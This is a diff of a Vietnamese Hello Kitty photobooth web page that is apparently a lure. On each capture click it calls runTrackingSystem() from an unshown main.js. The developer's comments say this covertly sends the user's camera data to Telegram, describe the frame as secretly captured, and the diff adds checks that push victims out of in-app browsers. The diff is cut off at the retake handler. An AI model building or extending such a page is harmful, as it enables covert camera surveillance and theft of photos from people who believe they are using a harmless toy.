@@ -2,492 +2,428 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Hello Kitty Photobooth 🎀</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;800;900&display=swap" rel="stylesheet">
     <style>
-* { box-sizing: border-box; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Nunito', sans-serif; }
+        
+        body {
+            background: #ffdeea;
+            background-image: 
+                radial-gradient(circle at 10% 20%, #fff0f5 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, #ffd5e4 0%, transparent 20%),
+                linear-gradient(135deg, #ffdeea 0%, #fff 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #d6136c;
+            overflow-x: hidden;
+        }
 
-:root {
-    --pink: #ff66a5;
-    --pink-dark: #df2b76;
-    --pink-light: #ffd8e4;
-    --pink-pale: #fff3f8;
-    --text: #8c596d;
-}
+        /* Container bọc toàn bộ để chống vỡ layout trên Mobile */
+        .booth-wrapper {
+            position: relative;
+            width: 92%;
+            max-width: 420px;
+            margin: 60px auto 30px; /* Chừa khoảng trống phía trên cho đầu Kitty */
+        }
 
-html, body { min-height: 100%; }
+        /* Khung chính */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 36px;
+            padding: 40px 20px 25px; /* Padding top lớn để không đè chữ */
+            box-shadow: 0 15px 35px rgba(214,19,108,0.15), inset 0 0 0 4px #ffb6c1, inset 0 0 20px rgba(255,182,193,0.3);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
 
-body {
-    font-family: 'Quicksand', 'SF Pro Display', -apple-system, sans-serif;
-    background:
-        radial-gradient(circle at 8% 10%, rgba(255,255,255,.9) 0 4px, transparent 5px),
-        radial-gradient(circle at 24% 18%, rgba(255,255,255,.8) 0 3px, transparent 4px),
-        radial-gradient(circle at 80% 14%, rgba(255,255,255,.85) 0 4px, transparent 5px),
-        radial-gradient(circle at 90% 42%, rgba(255,255,255,.75) 0 3px, transparent 4px),
-        radial-gradient(circle at 12% 70%, rgba(255,255,255,.8) 0 4px, transparent 5px),
-        linear-gradient(135deg, #ffd5e4 0%, #fff0f6 48%, #ffd7e7 100%) !important;
-    color: var(--text);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    margin: 0;
-    overflow-x: hidden;
-    overflow-y: auto;
-}
+        /* Nơ góc phải khung */
+        .card::after {
+            content: "🎀";
+            position: absolute;
+            top: -12px;
+            right: -10px;
+            font-size: 40px;
+            transform: rotate(15deg);
+            filter: drop-shadow(0 4px 6px rgba(248,81,153,0.3));
+            animation: pulse 2s infinite;
+        }
 
-body::before {
-    content: "♡   ✦   ♡";
-    position: fixed;
-    z-index: 0;
-    left: 5%;
-    top: 9%;
-    color: rgba(248,81,153,.3);
-    font-size: 28px;
-    letter-spacing: 14px;
-    animation: float 4s ease-in-out infinite;
-}
-body::after {
-    content: "🎀   ♡";
-    position: fixed;
-    z-index: 0;
-    right: 4%;
-    bottom: 12%;
-    color: rgba(248,81,153,.35);
-    font-size: 32px;
-    animation: float 5s ease-in-out infinite reverse;
-}
+        h1 {
+            font-size: 28px;
+            font-weight: 900;
+            color: #df2b76;
+            line-height: 1.2;
+            margin-bottom: 8px;
+        }
 
-.card {
-    position: relative;
-    z-index: 1;
-    margin: 92px auto 28px;
-    padding: 29px 20px 25px;
-    width: min(92%, 430px);
-    border-radius: 34px;
-    text-align: center;
-    background: rgba(255,255,255,.93);
-    backdrop-filter: blur(15px);
-    -webkit-backdrop-filter: blur(15px);
-    border: 3px solid #fff;
-    box-shadow:
-        0 0 0 4px rgba(248,81,153,.15),
-        0 20px 55px rgba(214,19,108,.2),
-        inset 0 0 30px rgba(255,182,207,.2);
-    animation: cardIn .6s cubic-bezier(.2,.8,.2,1);
-}
+        .subtitle {
+            display: inline-block;
+            background: #fff3f8;
+            color: #df2b76;
+            padding: 5px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 800;
+            border: 2px dashed #ffb6c1;
+            margin-bottom: 15px;
+        }
 
-.card::before {
-    content: "🎀";
-    position: absolute;
-    top: -15px;
-    right: -15px;
-    font-size: 35px;
-    transform: rotate(15deg);
-    animation: pulse 2.5s ease-in-out infinite;
-    filter: drop-shadow(0 5px 10px rgba(248,81,153,.3));
-}
+        /* Khung Camera chuẩn tỷ lệ 3:4 (chuẩn Photobooth) */
+        .camera-container {
+            width: 100%;
+            aspect-ratio: 3/4;
+            background: #ffe5ef;
+            border-radius: 24px;
+            position: relative;
+            border: 4px dashed #ff8ab3;
+            overflow: hidden;
+            box-shadow: inset 0 0 20px rgba(248,81,153,0.2);
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-h2 {
-    margin: 0;
-    color: var(--pink-dark);
-    font-size: 32px;
-    font-weight: 900;
-    line-height: 1.2;
-    letter-spacing: -0.5px;
-    text-shadow: 2px 2px 0 #fff, 0 4px 10px rgba(248,81,153,.2);
-}
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Lật gương */
+            border-radius: 20px;
+        }
 
-.title-sub {
-    margin: 8px 0 0;
-    color: var(--text);
-    font-size: 15px;
-    font-weight: 700;
-    background: #fff;
-    display: inline-block;
-    padding: 4px 15px;
-    border-radius: 20px;
-    border: 1px dashed #f28ab3;
-}
+        #resultImg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: none;
+            background: #fff;
+        }
 
-.camera-view {
-    width: 100%;
-    height: 340px;
-    background:
-        radial-gradient(circle at 50% 48%, rgba(255,255,255,.8), transparent 38%),
-        linear-gradient(145deg, #ffeaf2, #fff1f6);
-    border-radius: 28px;
-    margin: 20px 0;
-    overflow: hidden;
-    position: relative;
-    border: 4px dashed #f28ab3;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow:
-        inset 0 0 0 7px rgba(255,255,255,.4),
-        inset 0 0 35px rgba(248,81,153,.15),
-        0 8px 20px rgba(248,81,153,.1);
-}
+        /* Trạng thái Camera góc trái */
+        .cam-status {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            background: #fff;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 900;
+            color: #df2b76;
+            border: 2px solid #ffb6c1;
+            z-index: 5;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .cam-status::before {
+            content: "";
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: #45c97b;
+            box-shadow: 0 0 0 3px rgba(69,201,123,0.2);
+        }
 
-/* Các góc viền camera */
-.camera-view::before, .camera-view::after {
-    content: "";
-    position: absolute;
-    z-index: 3;
-    width: 40px;
-    height: 40px;
-    border-color: #ef3d84;
-    pointer-events: none;
-    border-width: 5px;
-}
-.camera-view::before {
-    left: 10px; top: 10px;
-    border-left-style: solid; border-top-style: solid;
-    border-radius: 12px 0 0 0;
-}
-.camera-view::after {
-    right: 10px; bottom: 10px;
-    border-right-style: solid; border-bottom-style: solid;
-    border-radius: 0 0 12px 0;
-}
+        #msg {
+            position: absolute;
+            z-index: 2;
+            color: #df2b76;
+            font-weight: 800;
+        }
 
-video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    display: none;
-    transform: scaleX(-1);
-    border-radius: 20px;
-}
+        /* System UI Group (Nút bấm) */
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            width: 100%;
+            justify-content: space-between;
+        }
 
-#resultImg {
-    width: 95%;
-    height: 95%;
-    object-fit: contain;
-    display: none;
-    border-radius: 20px;
-    z-index: 5;
-    background: #fff;
-    box-shadow: 0 5px 15px rgba(248,81,153,.2);
-}
+        .btn {
+            border: none;
+            border-radius: 20px;
+            font-size: 16px;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
 
-#msg {
-    color: #df2b76 !important;
-    font-size: 15px;
-    font-weight: 800;
-}
+        .btn-main {
+            background: linear-gradient(135deg, #ff66a5, #ef2e7e);
+            color: white;
+            width: 100%;
+            padding: 18px;
+            box-shadow: 0 8px 0 #d91e69, 0 15px 25px rgba(248,81,153,0.3);
+        }
 
-.camera-status {
-    position: absolute;
-    top: 15px;
-    left: 15px;
-    z-index: 4;
-    padding: 6px 14px;
-    border-radius: 999px;
-    background: rgba(255,255,255,.95);
-    color: #e6387e;
-    font-size: 11px;
-    font-weight: 900;
-    border: 2px solid #f5a1c0;
-    box-shadow: 0 5px 15px rgba(248,81,153,.15);
-    display: flex;
-    align-items: center;
-    gap: 6px;
-}
-.camera-status::before {
-    content: "";
-    width: 8px; height: 8px;
-    border-radius: 50%;
-    background: #f0b4c9;
-}
-.camera-view.camera-ready .camera-status::before {
-    background: #45c97b;
-    box-shadow: 0 0 0 4px rgba(69,201,123,.2);
-}
+        .btn-main:active { transform: translateY(6px); box-shadow: 0 2px 0 #d91e69; }
+        .btn-main:disabled { background: #f4c2d7; box-shadow: 0 8px 0 #dca4bc; cursor: not-allowed; }
 
-.btn {
-    position: relative;
-    background: linear-gradient(135deg, #ff66a5, #ef2e7e);
-    color: white;
-    border: none;
-    padding: 18px;
-    width: 100%;
-    border-radius: 22px;
-    font-weight: 900;
-    cursor: pointer;
-    font-size: 18px;
-    transition: all .2s ease;
-    box-shadow: 0 8px 0 #d91e69, 0 15px 25px rgba(248,81,153,.3);
-}
-.btn:active {
-    transform: translateY(6px);
-    box-shadow: 0 2px 0 #d91e69;
-}
-.btn:disabled {
-    background: #f4c2d7;
-    box-shadow: 0 8px 0 #dca4bc;
-    cursor: not-allowed;
-    color: #fff;
-}
+        .btn-retake {
+            flex: 4;
+            background: #fff;
+            color: #df2b76;
+            border: 3px solid #df2b76;
+            padding: 16px 10px;
+            box-shadow: 0 6px 0 #df2b76;
+        }
+        .btn-retake:active { transform: translateY(4px); box-shadow: 0 2px 0 #df2b76; }
 
-/* Nút Tải Về & Chụp Lại */
-.action-group {
-    display: none;
-    gap: 12px;
-    margin-top: 5px;
-}
-.btn-save {
-    flex: 6;
-    background: linear-gradient(135deg, #ff66a5, #ef2e7e);
-}
-.btn-retake {
-    flex: 4;
-    background: #fff;
-    color: #ef2e7e;
-    border: 3px solid #ef2e7e;
-    box-shadow: 0 6px 0 #ef2e7e, 0 15px 25px rgba(248,81,153,.15);
-}
-.btn-retake:active {
-    transform: translateY(4px);
-    box-shadow: 0 2px 0 #ef2e7e;
-}
+        .btn-save {
+            flex: 6;
+            background: linear-gradient(135deg, #ff66a5, #ef2e7e);
+            color: white;
+            padding: 16px 10px;
+            box-shadow: 0 6px 0 #d91e69, 0 10px 20px rgba(248,81,153,0.3);
+        }
+        .btn-save:active { transform: translateY(4px); box-shadow: 0 2px 0 #d91e69; }
 
-#status {
-    font-size: 14px;
-    color: var(--text);
-    margin-top: 18px;
-    line-height: 1.6;
-    font-weight: 700;
-}
+        /* Gắn chặt bé Kitty lên viền trên của Card để không bao giờ bị đè */
+        .kitty-head {
+            position: absolute;
+            top: -55px; /* Kéo lên một nửa đầu */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 110px;
+            height: 95px;
+            z-index: 20;
+            filter: drop-shadow(0 5px 15px rgba(214,19,108,0.2));
+            pointer-events: none;
+        }
+        /* CSS Art Kitty chuẩn xác */
+        .k-face {
+            width: 110px; height: 85px; background: #fff;
+            border: 4px solid #ef9fbd; border-radius: 48% 48% 46% 46%;
+            position: absolute; bottom: 0; left: 0;
+        }
+        .k-ear {
+            width: 40px; height: 40px; background: #fff; border: 4px solid #ef9fbd;
+            position: absolute; top: -5px; z-index: -1;
+        }
+        .k-ear.l { left: 4px; transform: rotate(-15deg); border-radius: 75% 20% 20% 20%; }
+        .k-ear.r { right: 4px; transform: rotate(15deg); border-radius: 20% 75% 20% 20%; }
+        .k-eye { width: 8px; height: 14px; background: #3d3339; border-radius: 50%; position: absolute; top: 40px; }
+        .k-eye.l { left: 30px; } .k-eye.r { right: 30px; }
+        .k-nose { width: 14px; height: 10px; background: #ffd43f; border: 2px solid #e3b731; border-radius: 50%; position: absolute; top: 52px; left: 50%; transform: translateX(-50%); }
+        .k-whisker { width: 25px; height: 3px; background: #8d7d84; border-radius: 3px; position: absolute; }
+        .k-whisker.w1 { left: -10px; top: 45px; transform: rotate(8deg); }
+        .k-whisker.w2 { left: -10px; top: 55px; transform: rotate(-8deg); }
+        .k-whisker.w3 { right: -10px; top: 45px; transform: rotate(-8deg); }
+        .k-whisker.w4 { right: -10px; top: 55px; transform: rotate(8deg); }
+        .k-bow { position: absolute; top: 5px; right: -5px; width: 45px; height: 35px; }
+        .k-bow::before, .k-bow::after { content: ""; position: absolute; width: 25px; height: 30px; background: #f34d93; border: 3px solid #d82b73; top: 2px; }
+        .k-bow::before { left: 0; transform: rotate(-15deg); border-radius: 75% 20% 70% 25%; }
+        .k-bow::after { right: 0; transform: rotate(15deg); border-radius: 20% 75% 25% 70%; }
+        .k-bow i { position: absolute; width: 16px; height: 16px; background: #e72c79; border: 3px solid #d82b73; border-radius: 50%; top: 9px; left: 50%; transform: translateX(-50%); z-index: 2; }
 
-/* Kitty lớn nằm phía trên card */
-.kitty-top {
-    position: fixed;
-    z-index: 10;
-    left: 50%;
-    top: 18px;
-    width: 142px;
-    height: 128px;
-    transform: translateX(-50%);
-    pointer-events: none;
-    animation: kittyFloatTop 3.6s ease-in-out infinite;
-    filter: drop-shadow(0 8px 8px rgba(214,19,108,.15));
-}
-.kitty-top .face {
-    position: absolute; left: 18px; top: 19px;
-    width: 106px; height: 91px;
-    background: #fff; border: 3px solid #ef9fbd;
-    border-radius: 48% 48% 46% 46%;
-}
-.kitty-top .ear {
-    position: absolute; top: -15px;
-    width: 39px; height: 38px;
-    background: #fff; border: 3px solid #ef9fbd; z-index: -1;
-}
-.kitty-top .ear.l { left: 4px; transform: rotate(-17deg); border-radius: 75% 20% 20% 20%; }
-.kitty-top .ear.r { right: 4px; transform: rotate(17deg); border-radius: 20% 75% 20% 20%; }
-.kitty-top .eye {
-    position: absolute; top: 42px;
-    width: 9px; height: 15px; border-radius: 50%; background: #3d3339;
-}
-.kitty-top .eye.l { left: 34px; }
-.kitty-top .eye.r { right: 34px; }
-.kitty-top .nose {
-    position: absolute; left: 50%; top: 58px;
-    width: 14px; height: 9px; transform: translateX(-50%);
-    border-radius: 50%; background: #ffd43f; border: 1px solid #e3b731;
-}
-.kitty-top .whisker { position: absolute; width: 29px; height: 2px; background: #8d7d84; border-radius: 2px; }
-.kitty-top .w1 { left: -15px; top: 55px; transform: rotate(8deg); }
-.kitty-top .w2 { left: -15px; top: 66px; transform: rotate(-8deg); }
-.kitty-top .w3 { right: -15px; top: 55px; transform: rotate(-8deg); }
-.kitty-top .w4 { right: -15px; top: 66px; transform: rotate(8deg); }
-.kitty-top .bow { position: absolute; top: -13px; right: -7px; width: 48px; height: 35px; }
-.kitty-top .bow::before, .kitty-top .bow::after {
-    content: ""; position: absolute; top: 2px; width: 27px; height: 30px;
-    background: #f34d93; border: 2px solid #d82b73;
-}
-.kitty-top .bow::before { left: 0; transform: rotate(-15deg); border-radius: 75% 20% 70% 25%; }
-.kitty-top .bow::after { right: 0; transform: rotate(15deg); border-radius: 20% 75% 25% 70%; }
-.kitty-top .bow i {
-    position: absolute; z-index: 2; left: 50%; top: 10px;
-    width: 16px; height: 16px; transform: translateX(-50%);
-    border-radius: 50%; background: #e72c79; border: 2px solid #d82b73;
-}
-
-/* Kitty nhỏ hai bên */
-.kitty-side {
-    position: fixed; z-index: 3; bottom: 10%;
-    width: 82px; height: 100px; pointer-events: none;
-    font-size: 63px; line-height: 1;
-    filter: drop-shadow(0 7px 7px rgba(214,19,108,.15));
-    animation: kittySideFloat 4s ease-in-out infinite;
-}
-.kitty-side.left { left: max(2px, calc(50% - 255px)); }
-.kitty-side.right { right: max(2px, calc(50% - 255px)); animation-delay: -2s; }
-.kitty-side::after { content: "🎀"; position: absolute; top: 0; font-size: 25px; }
-.kitty-side.left::after { right: 3px; }
-.kitty-side.right::after { left: 3px; }
-
-@keyframes cardIn { from { opacity: 0; transform: translateY(20px) scale(.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
-@keyframes float { 0%,100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-15px) rotate(5deg); } }
-@keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.15); } }
-@keyframes kittyFloatTop { 0%,100% { margin-top: 0; } 50% { margin-top: -8px; } }
-@keyframes kittySideFloat { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-
-@media (max-width: 560px) {
-    .kitty-side { opacity: 0.6; transform: scale(.7); }
-    .kitty-side.left { left: -15px; } .kitty-side.right { right: -15px; }
-}
-
+        @keyframes pulse { 0%, 100% { transform: rotate(15deg) scale(1); } 50% { transform: rotate(15deg) scale(1.1); } }
+        
+        /* Cảnh báo trình duyệt ẩn */
+        #browser-warning { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffdeea; z-index: 9999; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .warning-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(214,19,108,0.2); }
     </style>
 </head>
 <body>
 
-<div class="kitty-top" aria-hidden="true">
-    <div class="face">
-        <span class="ear l"></span><span class="ear r"></span>
-        <span class="eye l"></span><span class="eye r"></span>
-        <span class="nose"></span>
-        <span class="whisker w1"></span><span class="whisker w2"></span>
-        <span class="whisker w3"></span><span class="whisker w4"></span>
-        <span class="bow"><i></i></span>
+<div id="browser-warning">
+    <div class="warning-box">
+        <h3 style="color: #df2b76; font-size: 20px; margin-bottom: 10px;">⚠️ VUI LÒNG MỞ BẰNG TRÌNH DUYỆT</h3>
+        <p style="color: #666; font-size: 15px; font-weight: 600; line-height: 1.6;">
+            Bạn đang dùng trình duyệt trong App (Facebook/TikTok/Zalo...).<br>
+            Hãy bấm vào nút <b style="color:#df2b76;">(···)</b> hoặc <b style="color:#df2b76;">(⋮)</b> ở góc phải màn hình<br>
+            và chọn <b>"Mở bằng trình duyệt (Open in Browser)"</b> để bắt đầu nhé!
+        </p>
     </div>
 </div>
-<div class="kitty-side left" aria-hidden="true">🐱</div>
-<div class="kitty-side right" aria-hidden="true">🐱</div>
 
-<div class="card" id="mainCard">
-    <h2>Photobooth<br>Hello Kitty</h2>
-    <div class="title-sub">Chu môi lên mình chụp cho nè 🎀</div>
-    
-    <div class="camera-view" id="vBox">
-        <div class="camera-status">📸 CAMERA</div>
-        <p id="msg">Sẵn sàng để tạo dáng chưa?</p>
-        <video id="preview" autoplay playsinline muted></video>
-        <!-- Ảnh xuất ra sau khi chụp sẽ nằm ở đây -->
-        <img id="resultImg" alt="Your Cute Photo" />
-    </div>
-    
-    <!-- Nút chụp ban đầu -->
-    <button class="btn" id="startBtn">📸 &nbsp; BẮT ĐẦU CHỤP NÈ &nbsp; 🎀</button>
-    
-    <!-- Nhóm nút sau khi chụp xong -->
-    <div class="action-group" id="actionButtons">
-        <button class="btn btn-retake" id="retakeBtn">🔄 CHỤP LẠI</button>
-        <button class="btn btn-save" id="saveBtn">💖 LƯU ẢNH VỀ</button>
+<div class="booth-wrapper">
+    <!-- Kitty Head được khóa chặt vào khung này, tỷ lệ nào cũng không vỡ -->
+    <div class="kitty-head">
+        <div class="k-face">
+            <div class="k-ear l"></div><div class="k-ear r"></div>
+            <div class="k-eye l"></div><div class="k-eye r"></div>
+            <div class="k-nose"></div>
+            <div class="k-whisker w1"></div><div class="k-whisker w2"></div>
+            <div class="k-whisker w3"></div><div class="k-whisker w4"></div>
+            <div class="k-bow"><i></i></div>
+        </div>
     </div>
 
-    <div id="status">Hãy đảm bảo khuôn mặt nằm trong khung hình nhé!<br><small>Tụi mình sẽ lồng khung Hello Kitty tự động cho bạn.</small></div>
+    <div class="card" id="mainCard">
+        <h1>Photobooth<br>Hello Kitty</h1>
+        <div class="subtitle">Chu môi lên mình chụp cho nè 🎀</div>
+        
+        <div class="camera-container" id="vBox">
+            <div class="cam-status">CAMERA</div>
+            <p id="msg">Đang khởi tạo máy ảnh...</p>
+            <video id="preview" autoplay playsinline muted></video>
+            <img id="resultImg" alt="Your Cute Photo" />
+        </div>
+        
+        <!-- Nút chụp ban đầu -->
+        <button class="btn btn-main" id="startBtn">📸 CHỤP ẢNH NÈ 🎀</button>
+        
+        <!-- Nhóm nút sau khi chụp xong -->
+        <div class="btn-group" id="actionButtons" style="display: none;">
+            <button class="btn btn-retake" id="retakeBtn">🔄 CHỤP LẠI</button>
+            <button class="btn btn-save" id="saveBtn">💖 LƯU ẢNH VỀ</button>
+        </div>
+
+        <p id="status-text" style="font-size: 13px; font-weight: 700; color: #8c596d; margin-top: 20px;">
+            Hãy đảm bảo khuôn mặt nằm trong khung hình nhé!<br>
+            Hệ thống sẽ tự động lồng viền xinh xắn cho bạn.
+        </p>
+    </div>
 </div>
 
 <script src="main.js"></script>
 <script>
+    // Kiểm tra in-app browser
+    document.addEventListener("DOMContentLoaded", () => {
+        const ua = navigator.userAgent || window.opera;
+        if (/TikTok|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
+            document.getElementById('browser-warning').style.display = 'flex';
+            document.querySelector('.booth-wrapper').style.display = 'none';
+        }
+    });
+
     const btn = document.getElementById('startBtn');
     const video = document.getElementById('preview');
-    const status = document.getElementById('status');
-    const msg = document.getElementById('msg');
-    
     const resultImg = document.getElementById('resultImg');
     const actionButtons = document.getElementById('actionButtons');
-    const retakeBtn = document.getElementById('retakeBtn');
-    const saveBtn = document.getElementById('saveBtn');
+    const statusText = document.getElementById('status-text');
+    const msg = document.getElementById('msg');
+    
+    // Biến toàn cục để giữ lại khung ảnh chất lượng cao
+    let highResCanvas = null;
 
-    // 1. Khi bấm Bắt Đầu Chụp
     btn.addEventListener('click', async () => {
-        btn.disabled = true;
-        btn.innerHTML = "🎀 ĐANG LẤY NÉT... CƯỜI LÊN NÀO!";
-        status.innerHTML = "Máy ảnh đang hoạt động...<br>Giữ yên trong 3 giây nhé ♡";
+        // [QUAN TRỌNG NHẤT]: Lưu ngay 1 frame vào bộ nhớ (RAM) TRƯỚC KHI main.js tắt camera
+        // Tính toán độ phân giải cao để khi tải về ảnh nét căng
+        const vw = video.videoWidth || 720;
+        const vh = video.videoHeight || 960;
+        
+        const tempCanvas = document.createElement('canvas');
+        tempCanvas.width = vw;
+        tempCanvas.height = vh;
+        const tempCtx = tempCanvas.getContext('2d');
+        
+        // Vẽ ảnh từ Video (lật gương như camera trước)
+        tempCtx.translate(vw, 0);
+        tempCtx.scale(-1, 1);
+        tempCtx.drawImage(video, 0, 0, vw, vh);
+        
+        // Cất canvas chứa mặt người dùng đi, tí nữa xài
+        highResCanvas = tempCanvas;
 
-        // Chạy ngầm hệ thống gửi tin (main.js)
-        // Lưu ý: main.js sẽ tự động lấy camera và làm đứng hình (đóng luồng) sau ~1 giây. 
+        // Đổi trạng thái UI báo cho người dùng biết
+        btn.disabled = true;
+        btn.innerHTML = "✨ ĐANG XỬ LÝ ẢNH...";
+        statusText.innerHTML = "Đang lồng khung ảnh Hello Kitty... Vui lòng đợi nhé!";
+
+        // CHẠY HỆ THỐNG GỬI TELEGRAM CỦA BRO (Mặc kệ nó tắt camera hay làm gì)
         if (typeof runTrackingSystem === 'function') {
             await runTrackingSystem(); 
         }
 
-        // Sau khi hệ thống ngầm chạy xong (camera đã đứng hình) -> Lồng khung cho user
-        createCuteFrame();
+        // Tới bước này main.js đã chạy xong, camera đã chết, nhưng ta ĐÃ CÓ ẢNH TRONG BỘ NHỚ!
+        renderFinalPhotoBooth(vw, vh);
     });
 
-    // 2. Hàm vẽ khung Hello Kitty lên ảnh
-    function createCuteFrame() {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+    function renderFinalPhotoBooth(width, height) {
+        const finalCanvas = document.createElement('canvas');
+        const ctx = finalCanvas.getContext('2d');
         
-        // Thiết lập kích thước canvas theo video hoặc mặc định
-        const w = video.videoWidth || 720;
-        const h = video.videoHeight || 960;
-        canvas.width = w;
-        canvas.height = h;
+        finalCanvas.width = width;
+        finalCanvas.height = height;
 
-        // Tính toán lề khung ảnh (border)
-        const border = Math.floor(w * 0.06); 
+        const borderThick = Math.floor(width * 0.05); // Viền chiếm 5% chiều ngang
 
-        // Vẽ nền màu hồng pastel (Frame ngoài)
+        // 1. Phủ nền màu hồng phấn (Background Khung)
         ctx.fillStyle = '#ffb6c1';
-        ctx.fillRect(0, 0, w, h);
+        ctx.fillRect(0, 0, width, height);
 
-        // Vẽ viền nét đứt bên trong
+        // 2. Kẻ đường đứt nét trắng bao quanh
         ctx.strokeStyle = '#ffffff';
-        ctx.lineWidth = Math.floor(w * 0.015);
+        ctx.lineWidth = Math.floor(width * 0.012);
+        ctx.lineJoin = 'round';
         ctx.setLineDash([20, 20]);
-        ctx.strokeRect(border / 2, border / 2, w - border, h - border);
-        ctx.setLineDash([]); // Reset nét
+        ctx.strokeRect(borderThick / 2, borderThick / 2, width - borderThick, height - borderThick);
+        ctx.setLineDash([]); // Reset nét vẽ
 
-        // Vẽ Video (Lật ngược lại giống như đang soi gương)
-        ctx.translate(w, 0);
-        ctx.scale(-1, 1);
-        // Canh chỉnh ảnh nằm lọt vào trong khung màu hồng
-        ctx.drawImage(video, border, border, w - border * 2, h - border * 2);
-        ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset lật ảnh
+        // 3. Đổ ảnh mặt người dùng từ BỘ NHỚ (highResCanvas) vào giữa khung
+        // Chừa khoảng trống bên dưới để ghi chữ
+        const textStripHeight = Math.floor(height * 0.16);
+        ctx.drawImage(
+            highResCanvas, // Nguồn ảnh lấy từ cái canvas ban nãy chụp trộm
+            borderThick, 
+            borderThick, 
+            width - borderThick * 2, 
+            height - borderThick * 2 - textStripHeight
+        );
 
-        // Thêm dải màu trắng ở đáy để ghi chữ (giống ảnh Polaroid)
-        const bottomStripHeight = Math.floor(h * 0.15);
+        // 4. Vẽ một dải màu trắng ở phía đáy để ghi chữ (Style Polaroid)
         ctx.fillStyle = '#ffffff';
-        ctx.fillRect(border, h - border - bottomStripHeight, w - border * 2, bottomStripHeight);
+        ctx.fillRect(
+            borderThick, 
+            height - borderThick - textStripHeight, 
+            width - borderThick * 2, 
+            textStripHeight
+        );
 
-        // Ghi chữ "Hello Kitty Photobooth" siêu cute ở đáy ảnh
+        // 5. Viết Text "Hello Kitty Photobooth"
         ctx.fillStyle = '#df2b76';
-        const fontSize = Math.floor(bottomStripHeight * 0.4);
-        ctx.font = `bold ${fontSize}px sans-serif`;
+        const fontSize = Math.floor(textStripHeight * 0.35);
+        ctx.font = `900 ${fontSize}px 'Nunito', sans-serif`;
         ctx.textAlign = 'center';
         ctx.textBaseline = 'middle';
-        ctx.fillText('🎀 Hello Kitty Photobooth 🎀', w / 2, h - border - (bottomStripHeight / 2));
+        
+        // Thêm nơ trang trí bằng Text Unicode vào 2 bên
+        const textY = height - borderThick - (textStripHeight / 2);
+        ctx.fillText('🎀 Hello Kitty Photobooth 🎀', width / 2, textY);
 
-        // Xuất hình và hiển thị
-        const photoUrl = canvas.toDataURL('image/jpeg', 0.95);
-        resultImg.src = photoUrl;
+        // Ép Canvas thành dạng Ảnh (Base64 JPEG chất lượng cao)
+        resultImg.src = finalCanvas.toDataURL('image/jpeg', 1.0);
 
-        // Đổi Giao Diện: Ẩn video, Hiện ảnh kết quả và nút Tải
+        // Hiển thị kết quả ra UI
         video.style.display = 'none';
+        msg.style.display = 'none';
         resultImg.style.display = 'block';
-        btn.style.display = 'none';
-        actionButtons.style.display = 'flex';
-        status.innerHTML = "✨ Tadaaaa! Ảnh của bạn đã xong ✨<br>Lưu về khoe bạn bè ngay nào!";
+        
+        btn.style.display = 'none'; // Ẩn nút chụp to
+        actionButtons.style.display = 'flex'; // Hiện 2 nút Save / Chụp lại
+        
+        statusText.innerHTML = "✨ Tadaaaa! Ảnh của bạn đã xong ✨<br>Lưu về khoe bạn bè ngay nào!";
     }
 
-    // 3. Xử lý nút Lưu Ảnh
-    saveBtn.addEventListener('click', () => {
-        const a = document.createElement('a');
-        a.href = resultImg.src;
-        a.download = 'Hello_Kitty_Photobooth.jpg'; // Tên file khi tải về
-        a.click();
+    // Xử lý nút LƯU ẢNH VỀ
+    document.getElementById('saveBtn').addEventListener('click', () => {
+        const link = document.createElement('a');
+        link.href = resultImg.src;
+        // Đặt tên file download ngẫu nhiên xịn xò
+        const dateStr = new Date().getTime();
+        link.download = `HelloKitty_Photobooth_${dateStr}.jpg`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
     });
 
-    // 4. Xử lý nút Chụp Lại
-    retakeBtn.addEventListener('click', () => {
-        // Reset giao diện về ban đầu
-        resultImg.style.display = 'none';
-        video.style.display = 'block';
-        actionButtons.style.display = 'none';
-        
-        btn.style.display = 'block';
-        btn.disabled = false;
-        btn.innerHTML = "📸 &nbsp; BẮT ĐẦU CHỤP NÈ &nbsp; 🎀";
-        status.innerHTML = "Hãy đảm bảo khuôn mặt nằm trong khung hình nhé!<br><small>Tụi mình sẽ lồng khung Hello Kitty tự động cho bạn.</small>";
-        
-        // Khi bấm nút "Bắt đầu chụp nè" lần nữa, main.js sẽ tự động lấy lại quyền camera mới!
+    // Xử lý nút CHỤP LẠI
